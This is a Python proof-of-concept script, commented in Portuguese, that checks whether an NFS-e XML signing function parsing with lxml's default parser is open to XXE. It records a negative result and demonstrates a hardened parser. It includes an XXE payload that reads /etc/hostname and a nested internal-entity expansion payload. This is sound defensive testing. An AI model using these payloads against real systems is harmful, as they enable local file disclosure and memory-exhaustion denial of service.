"""PoC-6 (resultado NEGATIVO, mantido como registro): xml_signer.sign_dps_xml usa
etree.fromstring() com o parser PADRAO do lxml, sem parser endurecido.

No lxml/libxml2 atuais entidades EXTERNAS ja vem bloqueadas por padrao, entao XXE
NAO e exploravel hoje. Entidades INTERNAS ainda expandem. Fica como endurecimento.
"""
from lxml import etree

print("lxml", etree.LXML_VERSION, "libxml2", etree.LIBXML_VERSION)

xxe = b"""<?xml version="1.0"?>
<!DOCTYPE DPS [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<DPS xmlns="http://www.sped.fazenda.gov.br/nfse"><infDPS Id="DPS1"><x>&xxe;</x></infDPS></DPS>"""
print("[*] entidade EXTERNA no parser padrao ->", end=" ")
try:
    doc = etree.fromstring(xxe)  # exatamente a chamada de xml_signer.py:34
    print("RESOLVIDA:", repr(doc.find(".//{*}x").text), "  <- XXE explotavel")
except etree.XMLSyntaxError as exc:
    print("bloqueada pelo libxml2:", exc)

lol = b"""<?xml version="1.0"?>
<!DOCTYPE l [<!ENTITY a "AAAAAAAAAA"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;"><!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">]>
<l>&d;</l>"""
print("[*] entidades INTERNAS no parser padrao ->",
      len(etree.fromstring(lol).text), "bytes a partir de ~300 bytes de entrada")

safe = etree.XMLParser(resolve_entities=False, no_network=True, huge_tree=False)
print("[*] com parser endurecido, entidades internas ->",
      repr(etree.fromstring(lol, parser=safe).text))
